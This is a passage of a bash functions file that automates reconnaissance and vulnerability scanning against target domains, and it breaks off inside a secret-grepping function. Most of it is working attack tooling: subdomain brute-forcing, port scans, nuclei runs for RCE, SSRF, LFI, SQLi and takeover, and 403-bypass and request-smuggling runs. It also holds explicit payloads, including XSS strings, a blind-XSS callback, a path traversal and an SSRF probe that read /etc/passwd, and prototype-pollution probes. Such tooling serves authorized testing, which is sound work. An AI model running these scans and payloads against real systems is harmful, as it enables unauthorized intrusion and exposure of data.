#################
# Recon Functions - UPDATED 2025
#################

ResultsPath="$HOME/Recon"
ToolsPath="$HOME/Tools"
ConfigFolder="$HOME/.config"
GITHUB_TOKENS="${ToolsPath}/.github_tokens"
UserAgent="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
DIRS_LARGE="$HOME/Lists/raft-large-directories.txt"
DIRS_MEDIUM="$HOME/Lists/raft-medium-directories.txt"

red=$(tput setaf 1)
green=$(tput setaf 2)
yellow=$(tput setaf 3)
reset=$(tput sgr0)

# ─── WORKSPACE ────────────────────────────────────────────────────────────────

workspaceRecon() {
  name=$(echo $1 | unfurl -u domains)
  wdir="$ResultsPath/$name/$(date +%F)/"
  mkdir -p "$wdir"
  cd "$wdir"
  echo "$name" | anew domains
  echo "${green}[+] Workspace: $wdir${reset}"
}

# ─── SUBDOMAIN ENUMERATION ────────────────────────────────────────────────────

subdomainenum() {
  echo "${yellow}[+] Recon subdomains...${reset}"
  Domain=$(cat domains)

  # Active sources (subfinder v2 - built-in multi-source)
  subfinder -nW -t 100 -all -o subfinder.subdomains -dL domains -silent
  cat subfinder.subdomains | anew all.subdomains && rm -f subfinder.subdomains

  # Amass passive (v4 syntax)
  amass enum -passive -norecursive -nf all.subdomains -df domains -o amass.subdomains 2>/dev/null
  cat amass.subdomains | anew all.subdomains && rm -f amass.subdomains

  # crt.sh
  curl -s "https://crt.sh/?q=%25.$Domain&output=json" | \
    jq -r '.[].name_value' | sed 's/\*\.//g' | anew all.subdomains

  # chaos (projectdiscovery)
  chaos -d "$Domain" -silent 2>/dev/null | anew all.subdomains

  # github-subdomains (with token if available)
  [ -f "$GITHUB_TOKENS" ] && \
    github-subdomains -d "$Domain" -t "$GITHUB_TOKENS" -o github.subs 2>/dev/null && \
    cat github.subs | anew all.subdomains && rm -f github.subs

  # uncover — search engines (shodan, fofa, censys)
  uncover -q "$Domain" -silent 2>/dev/null | unfurl domains | anew all.subdomains

  # Resolve
  cat all.subdomains | dnsx -silent -r "$HOME/Lists/resolvers-trusted.txt" | anew clean.subdomains
  echo "${green}[+] Passive subdomain recon completed: $(wc -l < clean.subdomains) hosts${reset}"
}

wellSubRecon() {
  subdomainenum
  # ASN → CIDR via asnmap (replaces metabigor for this)
  [ -s "domains" ] && asnmap -d "$(cat domains)" -silent 2>/dev/null | anew cidr
  [ -s "cidr" ] && cat cidr | anew clean.subdomains
  brutesub
}

certspotter() {
  curl -s "https://api.certspotter.com/v1/issuances?domain=$1&expand=dns_names&expand=issuer&expand=cert" | \
    jq -c '.[].dns_names' | grep -o '"[^"]\+"' | tr -d '"' | sort -fu
}

crtsh() {
  curl -s "https://crt.sh/?q=%.$1" | sed 's/<\/\?[^>]\+>//g' | grep "$1"
}

cert() {
  curl -s "https://crt.sh/?q=%.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew
}

ipinfo() {
  curl -s "http://ipinfo.io/$1"
}

getfreshresolvers() {
  wget -q -O "$HOME/Lists/resolvers.txt"         "https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt"
  wget -q -O "$HOME/Lists/resolvers-trusted.txt" "https://raw.githubusercontent.com/trickest/resolvers/main/resolvers-trusted.txt"
}

getalltxt() {
  wget -q -O "$HOME/Lists/all.txt" \
    "https://gist.githubusercontent.com/jhaddix/86a06c5dc309d08580a018c66354a056/raw/96f4e51d96b2203f19f6381c8c545b278eaa0837/all.txt"
}

# ─── DNS RECORDS ──────────────────────────────────────────────────────────────

dnsrecords() {
  echo "${yellow}[+] Collecting DNS records${reset}"
  mkdir -p dnshistory
  cat clean.subdomains | dnsx -silent -a  -resp-only -o dnsx.txt
  cat clean.subdomains | dnsx -a   -resp -silent -o dnshistory/A-records
  cat clean.subdomains | dnsx -ns  -resp -silent -o dnshistory/NS-records
  cat clean.subdomains | dnsx -cname -resp -silent -o dnshistory/CNAME-records
  cat clean.subdomains | dnsx -soa -resp -silent -o dnshistory/SOA-records
  cat clean.subdomains | dnsx -ptr -resp -silent -o dnshistory/PTR-records
  cat clean.subdomains | dnsx -mx  -resp -silent -o dnshistory/MX-records
  cat clean.subdomains | dnsx -txt -resp -silent -o dnshistory/TXT-records
  cat clean.subdomains | dnsx -aaaa -resp -silent -o dnshistory/AAAA-records
  echo "${green}[+] DNS records saved in dnshistory/${reset}"
}

nstakeover() {
  for domain in $(cat "$1"); do
    dig "$domain" +trace | grep NS | awk '{print $5}' | anew | \
      grep -Ev "root-servers|NS|NSEC3|NSEC" | sed 's/\.$//' | \
      xargs -I{} bash -c "dig @{} $domain | grep -E 'SERVFAIL|REFUSED' && echo '$domain - {} Is vulnerable'"
  done
}

# ─── PORT SCANNING ────────────────────────────────────────────────────────────

naabuRecon() {
  echo "${yellow}[+] Naabu port scan${reset}"
  naabu -l clean.subdomains \
    -r "$HOME/Lists/resolvers.txt" \
    -ec \
    -p 80,443,81,300,591,593,832,981,1010,1099,1311,2082,2095,2096,2480,\
3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,\
6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,\
8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,\
8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,9502,\
9800,9981,10000,10250,11371,12443,15672,16080,17778,18091,18092,20720,32000,\
55440,55672 \
    -sa -o naabuScanFull
  if [ -s "naabuScanFull" ]; then
    # Extrai apenas linhas host:porta validas (sem linhas de log com colchetes)
    grep -oP '^[\w.\-]+:\d+$' naabuScanFull > naabuScan
    # fallback: se regex acima nao capturar nada, remove linhas de log
    [ ! -s "naabuScan" ] && grep -v '^\[' naabuScanFull | grep -v '^$' > naabuScan
  fi
  echo "${green}[+] naabu: $(wc -l < naabuScan 2>/dev/null) hosts:portas${reset}"
}

naabuFullPorts() {
  naabu -p - -l clean.subdomains \
    -exclude-ports 80,443,8443,21,25,22 \
    -o full_ports.txt
}

# TLS fingerprinting via tlsx (NEW)
tlsEnum() {
  echo "${yellow}[+] TLS Enumeration${reset}"
  cat clean.subdomains | tlsx -silent -san -cn -o tlsx_output.txt
  cat tlsx_output.txt | grep -oP '(?<=SAN: ).*' | sed 's/,/\n/g' | anew clean.subdomains
}

# ─── HTTP PROBING ─────────────────────────────────────────────────────────────

getalive() {
  echo "${yellow}[+] Check live hosts${reset}"

  # Verifica se naabuScan tem conteudo antes de prosseguir
  if [ ! -s "naabuScan" ]; then
    echo "${red}[!] naabuScan vazio ou inexistente — abortando getalive${reset}"
    return 1
  fi

  # httpx: NAO usar -silent junto com -o pois em algumas versoes o arquivo fica vazio.
  # Capturamos stdout com tee para garantir que HTTPOK seja populado.
  # -no-color evita escape codes que quebram o grep posterior.
  cat naabuScan | httpx -status-code -tech-detect -title -cl \
    -favicon -timeout 15 -threads 50 -random-agent -no-color 2>/dev/null | tee HTTPOK

  if [ ! -s "HTTPOK" ]; then
    echo "${red}[!] HTTPOK vazio — nenhum host respondeu${reset}"
    return 1
  fi

  # Limpa arquivos de runs anteriores para evitar dados obsoletos
  > ALLHTTP
  > 200HTTP
  > 403HTTP
  > Without404

  # Extrai a URL (1a coluna) de forma robusta com grep -oP
  grep -oP 'https?://\S+' HTTPOK | sort -u > ALLHTTP
  grep -oP 'https?://\S+' <(grep '\[200\]' HTTPOK)                                  | sort -u > 200HTTP
  grep -oP 'https?://\S+' <(grep -E '\[40[0-4]\]' HTTPOK | grep -v '\[404\]')       | sort -u > 403HTTP
  grep -oP 'https?://\S+' <(grep -v '\[404\]' HTTPOK)                               | sort -u > Without404

  echo "${green}[+] Live hosts  : $(wc -l < ALLHTTP)${reset}"
  echo "${green}[+]   200       : $(wc -l < 200HTTP)${reset}"
  echo "${green}[+]   403/40x   : $(wc -l < 403HTTP)${reset}"
  echo "${green}[+]   sem-404   : $(wc -l < Without404)${reset}"
}

# ─── SUBDOMAIN BRUTE-FORCE & PERMUTATION ─────────────────────────────────────

brutesub() {
  echo "${yellow}[+] Brute subdomains${reset}"
  getfreshresolvers
  getalltxt
  bruteTop1million
  bruteAlltxt
  echo "${green}[+] Brute complete${reset}"
}

bruteTop1million() {
  for domain in $(cat domains); do
    shuffledns -d "$domain" -r "$HOME/Lists/resolvers.txt" \
      -w "$HOME/Lists/subdomains-top1million-110000.txt" -o brutesubs_out.txt
    cat brutesubs_out.txt | anew clean.subdomains
  done
  rm -f brutesubs_out.txt
}

bruteAlltxt() {
  for domain in $(cat domains); do
    shuffledns -d "$domain" -r "$HOME/Lists/resolvers.txt" \
      -w "$HOME/Lists/all.txt" -o brutesubs_out.txt
    cat brutesubs_out.txt | anew clean.subdomains
  done
  rm -f brutesubs_out.txt
}

subPermutation() {
  echo "${yellow}[+] Permutation with alterx (replaces altdns)${reset}"
  # alterx is faster and maintained by PD
  cat clean.subdomains | alterx -silent | anew alt-output.txt
  shuffledns -l alt-output.txt -r "$HOME/Lists/resolvers.txt" -o final.txt
  cp clean.subdomains oldsubs
  [ -s 'alt-output.txt' ] && rm -rf alt-output.txt
  cat final.txt | anew clean.subdomains
  echo "${green}[+] Permutation done: $(wc -l < clean.subdomains) hosts${reset}"
}

# ─── CRAWLING & URL HARVESTING ────────────────────────────────────────────────

crawler() {
  echo "${yellow}[+] Crawler in action${reset}"
  Domain=$(cat domains)
  mkdir -p .tmp

  # gospider
  gospider -S Without404 -d 10 -c 20 -t 50 -K 3 --no-redirect --js -a -w \
    --blacklist ".(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|svg|txt)" \
    --include-subs -q -o .tmp/gospider 2>/dev/null | anew -q gospider_out

  # waybackurls
  xargs -a Without404 -P 50 -I % bash -c "echo % | waybackurls" 2>/dev/null | anew -q waybackurls_out

  # gau v2 (updated flags)
  xargs -a Without404 -P 50 -I % bash -c \
    "gau % --blacklist eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,svg,txt \
     --retries 3 --threads 5" 2>/dev/null | anew -q gau_out

  # katana (active crawl with JS rendering)
  katana -list Without404 -d 4 -jc -kf all \
    -ef eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,svg,txt \
    -output katana_output.txt 2>/dev/null

  # waymore (wayback + common crawl)
  for domain in $(cat domains); do
    waymore -i "$domain" -mode U -oU ".tmp/waymore_${domain}.txt" 2>/dev/null
    cat ".tmp/waymore_${domain}.txt" 2>/dev/null | anew -q gau_out
  done

  # Merge & deduplicate
  cat gospider_out gau_out waybackurls_out katana_output.txt 2>/dev/null | \
    sed '/\[/d' | grep "$Domain" | sort -u | uro | anew -q crawlerResults.txt

  echo "${green}[+] Crawler done: $(wc -l < crawlerResults.txt) URLs${reset}"
}

# ─── JS ANALYSIS ──────────────────────────────────────────────────────────────

JScrawler() {
  # katana with JS crawl, deeper recursion
  katana -jc -d 5 -rd 5 -u 200HTTP \
    -ef eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,svg,txt \
    -o crawlJS 2>/dev/null
  cat crawlJS | grep "\.js$" | fff -d 50 -S -o JSroot
}

getjsurls() {
  echo "${yellow}[+] Get JS files${reset}"
  Domain=$(cat domains)
  [ -s "crawlerResults.txt" ] && cat crawlerResults.txt | grep "$Domain" | \
    grep -Ei "\.(js)" | grep -iEv '(\.jsp|\.json)' | anew -q url_extract_js.txt
  [ -s "url_extract_js.txt" ] && cat url_extract_js.txt | cut -d '?' -f 1 | \
    grep -Ei "\.(js)" | grep -iEv '(\.jsp|\.json)' | grep "$Domain" | anew -q jsfile_links.txt
  [ -s "ALLHTTP" ] && cat ALLHTTP | subjs | grep "$Domain" | anew -q jsfile_links.txt
  [ -s "ALLHTTP" ] && cat ALLHTTP | getJS --complete | grep "$Domain" | anew -q jsfile_links.txt
  [ -s "jsfile_links.txt" ] && cat jsfile_links.txt | \
    httpx -follow-redirects -random-agent -silent -status-code -retries 2 -no-color | \
    grep 200 | grep -v 301 | cut -d " " -f 1 | anew -q js_livelinks.txt
  [ -s "jsfile_links.txt" ] && cat js_livelinks.txt | fff -d 1 -S -o JSroots
  echo "${green}[+] JS files: $(wc -l < js_livelinks.txt 2>/dev/null)${reset}"
}

getjsdata() {
  echo "${yellow}[+] Secrets in JS${reset}"
  [ -s "js_livelinks.txt" ] && cat js_livelinks.txt | nuclei -tags exposure,token -H "$UserAgent" -o jsinfo
  [ -s "jsinfo" ] && notify -silent -bulk -data jsinfo -id nuclei
}

secretfinder() {
  echo "${yellow}[+] SecretFinder${reset}"
  regexs=$(curl -s 'https://gist.githubusercontent.com/mswell/1070fae0021b08d5e5650743ea402b4b/raw/589e669dec183009f01eca2c2ef1401b5f77af2b/regexJS' | tr '\n' '|')
  rush -i js_livelinks.txt \
    'python3 $HOME/Tools/SecretFinder/SecretFinder.py -i {} -o cli -r "\\w+($regexs)\\w+" | grep -v custom_regex | anew js_secrets_result'
  cat js_secrets_result | grep -v custom_regex | grep -iv '[URL]:' | anew JSPathNoUrl
  cat JSPathNoUrl | python3 "$HOME/Tools/BBTz/collector.py" JSOutput
}

awsCognitoFinder() {
  cd JSroot
  grep -lri 'AWSCognitoIdentity' | anew awsVector
  [ -s "awsVector" ] && echo "[+] AWS Cognito found!" | notify -silent -id nuclei
  [ -s "awsVector" ] && notify -silent -bulk -data awsVector -id nuclei
  cd -
}

# ─── NUCLEI SCANS ─────────────────────────────────────────────────────────────

updateTemplatesNuc() {
  nuclei -update-templates
}

panelNuc() {
  echo "${yellow}[+] Panel scan${reset}"
  [ -s "ALLHTTP" ] && cat ALLHTTP | nuclei -tags panel -H "$UserAgent" -o nucPanel
  [ -s "nucPanel" ] && echo "Panel found" | notify -silent -id nuclei
  [ -s "nucPanel" ] && notify -silent -bulk -data nucPanel -id nuclei
}

rceNuc() {
  echo "${yellow}[+] RCE scan${reset}"
  [ -s "ALLHTTP" ] && cat ALLHTTP | nuclei -tags rce -H "$UserAgent" -o rcevector
  [ -s "rcevector" ] && echo "RCE found!" | notify -silent -id nuclei
  [ -s "rcevector" ] && notify -silent -bulk -data rcevector -id nuclei
}

exposureNuc() {
  echo "${yellow}[+] Exposure scan${reset}"
  [ -s "ALLHTTP" ] && cat ALLHTTP | nuclei -tags exposure -H "$UserAgent" -o exposurevector
  [ -s "exposurevector" ] && echo "Exposure found" | notify -silent -id nuclei
  [ -s "exposurevector" ] && notify -silent -bulk -data exposurevector -id nuclei
}

lfiScan() {
  echo "${yellow}[+] LFI scan${reset}"
  cat ALLHTTP | nuclei -tags lfi -H "$UserAgent" -o lfivector
  [ -s "lfivector" ] && echo "LFI found!" | notify -silent -id nuclei
  [ -s "lfivector" ] && notify -silent -bulk -data lfivector -id nuclei
}

ssrfdetect() {
  echo "${yellow}[+] SSRF Detect${reset}"
  cat ALLHTTP | nuclei -tags ssrf -H "$UserAgent" -o ssrfdetect
  [ -s "ssrfdetect" ] && echo "SSRF found!" | notify -silent -id nuclei
  [ -s "ssrfdetect" ] && notify -silent -bulk -data ssrfdetect -id nuclei
}

GitScan() {
  echo "${yellow}[+] Git scan${reset}"
  cat ALLHTTP | nuclei -tags git -H "$UserAgent" -o gitvector
  [ -s "gitvector" ] && echo "Git exposure found!" | notify -silent -id nuclei
  [ -s "gitvector" ] && notify -silent -bulk -data gitvector -id nuclei
}

jiraScan() {
  echo "${yellow}[+] Jira scan${reset}"
  cat ALLHTTP | nuclei -t "$HOME/custom_nuclei_templates/ssrf-jira-well.yaml" -H "$UserAgent" -o jiraNuclei
  [ -s "jiraNuclei" ] && echo "Jira vector found!" | notify -silent -id nuclei
  [ -s "jiraNuclei" ] && notify -silent -bulk -data jiraNuclei -id nuclei
}

graphqldetect() {
  echo "${yellow}[+] GraphQL detect${reset}"
  cat ALLHTTP | nuclei -id graphql-detect -H "$UserAgent" -o graphqldetect
  # Also try introspection check
  cat ALLHTTP | nuclei -tags graphql -H "$UserAgent" -o graphqlvectors 2>/dev/null
  [ -s "graphqldetect" ] && echo "GraphQL found!" | notify -silent -id api
  [ -s "graphqldetect" ] && notify -silent -bulk -data graphqldetect -id api
}

swaggerUIdetect() {
  echo "${yellow}[+] Swagger detect${reset}"
  [ -s "ALLHTTP" ] && cat ALLHTTP | nuclei -tags swagger -H "$UserAgent" -o swaggerUI
  # Also run custom template
  [ -s "ALLHTTP" ] && cat ALLHTTP | nuclei -t "$HOME/custom_nuclei_templates/api-recon-workflow.yaml" \
    -H "$UserAgent" -o swaggerCustom 2>/dev/null
  [ -s "swaggerUI" ] && echo "Swagger found!" | notify -silent -id api
  [ -s "swaggerUI" ] && notify -silent -bulk -data swaggerUI -id api
}

APIRecon() {
  echo "${yellow}[+] API endpoint recon${reset}"
  [ -s "ALLHTTP" ] && cat ALLHTTP | nuclei \
    -w "$HOME/custom_nuclei_templates/api-recon-workflow.yaml" \
    -H "$UserAgent" -o nucleiapirecon
  # Additional: fuzz API routes from assetnote wordlist
  [ -s "ALLHTTP" ] && for host in $(cat ALLHTTP | head -100); do
    ffuf -u "$host/FUZZ" -w "$HOME/Lists/httparchive_apiroutes.txt" \
      -mc 200,201,204,301,302,401,403 -t 50 -s -o ".tmp/api_${host//\//_}.json" \
      -of json 2>/dev/null
  done
  [ -s "nucleiapirecon" ] && echo "API found!" | notify -silent -id api
  [ -s "nucleiapirecon" ] && notify -silent -bulk -data nucleiapirecon -id api
}

# CVE scan (NEW — uses cvemap + nuclei)
cveScan() {
  echo "${yellow}[+] CVE scan via cvemap + nuclei${reset}"
  # Get recent high/critical CVEs with nuclei templates
  cat ALLHTTP | nuclei -severity high,critical -H "$UserAgent" \
    -eid expired-ssl,mismatched-ssl,deprecated-tls,weak-cipher-suites,self-signed-ssl \
    -o cveResults
  [ -s "cveResults" ] && echo "CVE found!" | notify -silent -id nuclei
  [ -s "cveResults" ] && notify -silent -bulk -data cveResults -id nuclei
}

nucauto() {
  [ -s "cleanHakipResult.txt" ] && cat cleanHakipResult.txt | httpx -silent | anew ALLHTTP
  cat ALLHTTP | nuclei -H "$UserAgent" \
    -eid expired-ssl,mismatched-ssl,deprecated-tls,weak-cipher-suites,self-signed-ssl \
    -severity critical,high,medium,low -o resultNuclei
  [ -s "resultNuclei" ] && notify -silent -bulk -data resultNuclei -id nuclei
}

massALLHTTPtemplate() {
  find /root/Projects -type f -name ALLHTTP | xargs -I{} -P2 bash -c 'cat {}' | anew allhttpalive
  cat allhttpalive | nuclei -t "$1" -o massALLTEST.txt
  [ -s "massALLTEST.txt" ] && cat massALLTEST.txt | notify -silent
}

nucTakeover() {
  echo "${yellow}[+] Takeover scan${reset}"
  cat ALLHTTP | nuclei -tags takeover -H "$UserAgent" -o nucleiTakeover
  [ -s "nucleiTakeover" ] && echo "Takeover found!" | notify -silent -id nuclei
  [ -s "nucleiTakeover" ] && notify -silent -bulk -data nucleiTakeover -id nuclei
  cat ALLHTTP | nuclei -t "$HOME/custom_nuclei_templates/m4cddr-takeovers.yaml" \
    -H "$UserAgent" -o takeovers_m4c
  [ -s "takeovers_m4c" ] && echo "Takeover (m4c) found!" | notify -silent -id nuclei
  [ -s "takeovers_m4c" ] && notify -silent -bulk -data takeovers_m4c -id nuclei
}

# ─── XSS ──────────────────────────────────────────────────────────────────────

XssScan() {
  echo "${yellow}[+] XSS scan${reset}"
  cat ALLHTTP | nuclei -tags xss -es info -H "$UserAgent" -o xssnuclei
  [ -s "xssnuclei" ] && echo "XSS found!" | notify -silent -id xss
  [ -s "xssnuclei" ] && notify -silent -bulk -data xssnuclei -id xss
}

xsshunter() {
  echo "INIT XSS HUNTER" | notify -silent -id xss
  for domain in $(cat domains); do
    waymore -i "$domain" -mode U -oU ".tmp/waymore_${domain}.txt" 2>/dev/null
    cat ".tmp/waymore_${domain}.txt" | awk '{print tolower($0)}' | anew urldump.txt
  done
  [ -s "urldump.txt" ] && cat urldump.txt | uro | kxss | awk '{print $0}' | anew xssvector
  [ -s "urldump.txt" ] && cat urldump.txt | uro | gf xss | httpx -silent | anew xssvector
  # dalfox (more powerful XSS scanner)
  [ -s "xssvector" ] && dalfox file xssvector --skip-bav -b "$BXSS_CALLBACK" -o XSSresult 2>/dev/null
  [ -s "XSSresult" ] && cat XSSresult | notify -silent -id xss
  # airixss
  [ -s "xssvector" ] && cat xssvector | qsreplace '"><svg onload=confirm(1)>' | \
    airixss -payload "confirm(1)" | grep -v 'Not' | anew airixss.txt
  [ -s "airixss.txt" ] && notify -silent -bulk -data airixss.txt -id xss
  # freq
  [ -s "xssvector" ] && cat xssvector | qsreplace '"><img src=x onerror=alert(1);>' | \
    freq | grep -v 'Not' | anew FreqXSS.txt
  [ -s "FreqXSS.txt" ] && notify -silent -bulk -data FreqXSS.txt -id xss
}

xssknox() {
  [ -s "waybackdata" ] && cat waybackdata | uro | kxss | awk '{print $9}' | anew kxssresult
  [ -s "kxssresult" ] && python3 "$HOME/Tools/knoxnl/knoxnl.py" -i kxssresult -s -o xssSuccess
  [ -s "xssSuccess" ] && echo "XSS via KNOXSS!" | notify -silent -id xss
  [ -s "xssSuccess" ] && notify -silent -bulk -data xssSuccess -id xss
}

OpenRedirectScan() {
  echo "${yellow}[+] OpenRedirect scan${reset}"
  cat ALLHTTP | nuclei -tags redirect -es info -H "$UserAgent" -o openredirectVector
  [ -s "openredirectVector" ] && echo "OpenRedirect found!" | notify -silent -id nuclei
  [ -s "openredirectVector" ] && cat openredirectVector | notify -silent -id nuclei
}

# ─── SQLI (NEW) ───────────────────────────────────────────────────────────────

sqliScan() {
  echo "${yellow}[+] SQLi scan${reset}"
  cat ALLHTTP | nuclei -tags sqli -H "$UserAgent" -o sqlivector
  [ -s "sqlivector" ] && echo "SQLi found!" | notify -silent -id nuclei
  [ -s "sqlivector" ] && notify -silent -bulk -data sqlivector -id nuclei
}

# ─── SSTI (NEW) ───────────────────────────────────────────────────────────────

sstiScan() {
  echo "${yellow}[+] SSTI scan${reset}"
  cat ALLHTTP | nuclei -tags ssti -H "$UserAgent" -o sstivector
  [ -s "sstivector" ] && echo "SSTI found!" | notify -silent -id nuclei
  [ -s "sstivector" ] && notify -silent -bulk -data sstivector -id nuclei
}

# ─── PARAMS ───────────────────────────────────────────────────────────────────

paramspider() {
  echo "${yellow}[+] ParamSpider${reset}"
  for url in $(cat ALLHTTP); do
    python3 "$HOME/Tools/ParamSpider/paramspider.py" -d "$url" \
      --exclude jpg,png,gif,woff,css,js,svg,woff2,ttf,eot,json 2>/dev/null
  done
  cat output/http:/*.txt 2>/dev/null | anew params
  cat output/https:/*.txt 2>/dev/null | anew params
}

arjunScan() {
  echo "${yellow}[+] Arjun param discovery${reset}"
  cat ALLHTTP | xargs -P 10 -I% arjun -u % --stable -q -oT arjun_params.txt 2>/dev/null
  [ -s "arjun_params.txt" ] && cat arjun_params.txt | notify -silent -id nuclei
}

# ─── 403 BYPASS ───────────────────────────────────────────────────────────────

bypass4xx() {
  echo "${yellow}[+] 403 bypass${reset}"
  [ -s "403HTTP" ] && cat 403HTTP | dirdar -only-ok | anew dirdarResult.txt
  [ -s "dirdarResult.txt" ] && cat dirdarResult.txt | sed -e '1,12d' | sed '/^$/d' | \
    anew 4xxbypass.txt | notify -silent -id subs
  # nomore403
  [ -s "403HTTP" ] && for url in $(cat 403HTTP); do
    python3 "$HOME/Tools/nomore403/nomore403.py" -u "$url" 2>/dev/null | \
      grep "200" | anew 4xxbypass_nm.txt
  done
}

# ─── CORS ─────────────────────────────────────────────────────────────────────

Corstest() {
  echo "${yellow}[+] CORS test${reset}"
  gf cors roots | awk -F '/' '{print $2}' | anew | httpx -silent -o CORSHTTP
  [ -s "CORSHTTP" ] && python3 "$HOME/Tools/CORStest/corstest.py" CORSHTTP -q | notify -silent
  # CORScanner (more thorough)
  [ -s "ALLHTTP" ] && python3 "$HOME/Tools/CORScanner/cors_scan.py" \
    -u "$(cat ALLHTTP | tr '\n' ',')" -o corsscan_result.txt 2>/dev/null
}

# ─── CLOUD ────────────────────────────────────────────────────────────────────

cloudEnum() {
  echo "${yellow}[+] Cloud asset enumeration${reset}"
  Domain=$(cat domains)
  # S3 buckets
  python3 "$HOME/Tools/S3Scanner/s3scanner.py" --bucket "$Domain" 2>/dev/null | anew s3buckets.txt
  python3 "$HOME/Tools/cloud_enum/cloud_enum.py" -k "$Domain" \
    --disable-azure --disable-gcp 2>/dev/null | anew cloud_assets.txt
  [ -s "cloud_assets.txt" ] && echo "Cloud assets found!" | notify -silent -id nuclei
  # nuclei cloud checks
  cat ALLHTTP | nuclei -tags aws,cloud,s3 -H "$UserAgent" -o cloudnuclei 2>/dev/null
  [ -s "cloudnuclei" ] && notify -silent -bulk -data cloudnuclei -id nuclei
}

# ─── TAKEOVER ─────────────────────────────────────────────────────────────────

subtakeover() {
  echo "${yellow}[+] Subdomain takeover${reset}"
  # SubOver (Go-based, fast)
  SubOver -l clean.subdomains -v 2>/dev/null | anew subtakeover_result.txt
  [ -s "subtakeover_result.txt" ] && cat subtakeover_result.txt | notify -silent -id subs
}

# ─── SMUGGLING ────────────────────────────────────────────────────────────────

smuggling() {
  cat ALLHTTP | rush -j 3 "python3 $ToolsPath/smuggler/smuggler.py -u {}" | \
    tee -a smuggler_op.txt
}

# ─── SCANNING COMBOS ──────────────────────────────────────────────────────────

scanPortsAndNuclei() {
  echo "${yellow}[+] Recon: mapcidr + naabu + nuclei${reset}"
  mapcidr -l dnsx.txt -silent -aggregate -o mapcidr.txt
  naabu -l mapcidr.txt -top-ports 1000 -silent -sa | \
    httpx -silent -timeout 60 -threads 100 -o naabuIP.txt
  cat naabuIP.txt | nuclei -silent -o nuclei.txt -severity low,medium,high,critical
  [ -s "nuclei.txt" ] && notify -silent -bulk -data nuclei.txt -id nuclei
}

massHakip2host() {
  echo "${yellow}[+] Mass hakip2host${reset}"
  Domain=$(cat domains)
  rush -i mapcidr.txt "prips {} | hakip2host | anew hakip2hostResult.txt"
  [ -s "hakip2hostResult.txt" ] && cat hakip2hostResult.txt | grep "$Domain" | \
    awk '{print $3}' | anew cleanHakipResult.txt
}

faviconEnum() {
  echo "${yellow}[+] FavFreak favicon enum${reset}"
  cat 200HTTP | python3 "$HOME/Tools/FavFreak/favfreak.py" --shodan -o outputFavFreak
}

screenshot() {
  echo "${yellow}[+] Screenshots with gowitness v3${reset}"
  # gowitness v3 (updated CLI)
  gowitness scan file -f ALLHTTP --screenshot-path ./screenshots --write-db 2>/dev/null
}

# ─── DATA GATHERING ───────────────────────────────────────────────────────────

getdata() {
  echo "${yellow}[+] Save all HTTP responses${reset}"
  cat ALLHTTP | fff -d 50 -S -o AllHttpData
}

# nginx path traversal
nginxpath() {
  echo "${yellow}[+] Nginx path traversal${reset}"
  ffuf -c -w ALLHTTP -u FUZZ////////../../../../../etc/passwd \
    -mr "root:x" -or -o nginxpath.txt
  [ -s "nginxpath.txt" ] && echo "Nginx traversal found!" | notify -silent
  [ -s "nginxpath.txt" ] && notify -silent -bulk -data nginxpath.txt -id nuclei
}

geojson() {
  echo "${yellow}[+] GeoJSON SSRF${reset}"
  ffuf -c -w ALLHTTP -u FUZZ/api/geojson?url=file:///etc/passwd \
    -mr "root:x" -or -o geojson.txt
  [ -s "geojson.txt" ] && echo "geojson SSRF found!" | notify -silent
  [ -s "geojson.txt" ] && cat geojson.txt | notify -silent
}

textinjection() {
  echo "${yellow}[+] Text injection${reset}"
  ffuf -c -w ALLHTTP -u FUZZ///example.com -mr 'Cannot GET' -or -o textinjection.txt
  [ -s "textinjection.txt" ] && echo "Text injection found!" | notify -silent
  [ -s "textinjection.txt" ] && cat textinjection.txt | notify -silent
}

prototypefuzz() {
  echo "${yellow}[+] Prototype pollution fuzz${reset}"
  cat ALLHTTP | sed 's/$/\/?__proto__[testparam]=exploit\//' | \
    page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | \
    sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | grep -v "NOT" | notify -silent
}

# ─── FUZZING HELPERS ──────────────────────────────────────────────────────────

fufapi() {
  # Updated: use assetnote API wordlist, ffuf v2 syntax
  ffuf -u "$1/FUZZ" -w "$HOME/Lists/httparchive_apiroutes.txt" \
    -mc 200,201,204,301,302,401,403 -t 100 -v
}

fufdir() {
  ffuf -u "$1/FUZZ" -w "$DIRS_LARGE" -mc 200,301,302,403 -t 170
}

fufextension() {
  ffuf -u "$1/FUZZ" -mc 200,301,302,403,401 -t 150 \
    -w "$ToolsPath/ffuf_extension.txt" \
    -e .php,.asp,.aspx,.jsp,.py,.txt,.conf,.config,.bak,.backup,.swp,.old,.db,.sql,.json,.xml,.log,.zip,.tar.gz,.env
}

feroxdir() {
  feroxbuster -u "$1" -e \
    --status-codes 200,204,301,307,401,405,400,302 \
    -k -w "$HOME/Lists/raft-large-directories.txt"
}

vhostEnum() {
  ffuf -w "$HOME/Lists/namelist.txt" \
    -u "http://$1" -H "HOST: FUZZ.$1" -fs 100 -t 100
}

# ─── SECRETS ──────────────────────────────────────────────────────────────────

secrets() {
  echo "[ + ] Checking for basic auth..."
  grep -HnriEo 'basic [a-zA-Z0-9=:+/-]{5,100}'

  echo "[ + ] Google Cloud / Maps API..."
  grep -HnriEo 'AIza[0-9A-Za-z\-]{35}'

  echo "[ + ] Slack webhooks..."
  grep -HnriEo 'https://hooks.slack.com/services/T[a-zA-Z0-9]{8}/B[a-zA-Z0-9]{8}/[a-zA-Z0-9]{24}'

  echo "[ + ] AWS Access Key..."
  grep -HnriEo 'AKIA[0-9A-Z]{16}'

  echo "[ + ] AWS Secret..."
